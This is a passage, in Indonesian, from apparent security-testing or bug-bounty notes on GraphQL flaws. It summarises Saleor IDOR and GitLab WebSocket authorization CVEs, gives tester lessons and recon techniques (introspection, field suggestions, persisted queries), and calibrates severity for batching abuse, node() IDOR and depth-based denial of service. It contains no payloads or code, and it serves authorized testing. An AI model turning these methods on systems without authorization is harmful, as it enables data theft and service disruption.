- **CVE-2026-24136 — Saleor GraphQL IDOR / Unauthenticated PII Exfiltration.** ID objek dari sisi klien dipakai pada resolver tanpa pemeriksaan kepemilikan.
  Lesson: e-commerce GraphQL (Saleor, Shopify Storefront, Vue Storefront) punya resolver yang mengambil `id` langsung dari argumen. Uji dengan **dua identitas**: query objek milik B dengan sesi A.
- **CVE-2026-5173 — GitLab WebSocket unauthorized method execution.** Bukan GraphQL, tapi pola berbagi: kanal realtime yang mengizinkan eksekusi method tanpa authz.
  Lesson: kalau target punya GraphQL **subscription** (WebSocket), uji authz di lapisan subscription terpisah — developer sering mengamankan query tapi lupa subscription.

**Teknik pendeteksi dari atlas lokal:** introspection (`__schema`), field-suggestion error sebagai pengganti introspection ketika dinonaktifkan, dan **APQ (automatic persisted queries)** — dengan APQ, skema bisa dipetakan tanpa introspection sama sekali karena server menyimpan hash query.


## Critical severity anchor (kelas ini bisa Critical — syaratnya)

Introspection → pemetaan skema (recon, bukan temuan); batching/alias abuse → rate limit bypass + race; per-field authz hilang → IDOR via `node()`; depth attack → DoS. Kalibrasi: introspection di-nonaktifkan di produksi = correct; field suggestion tanpa data = Info.
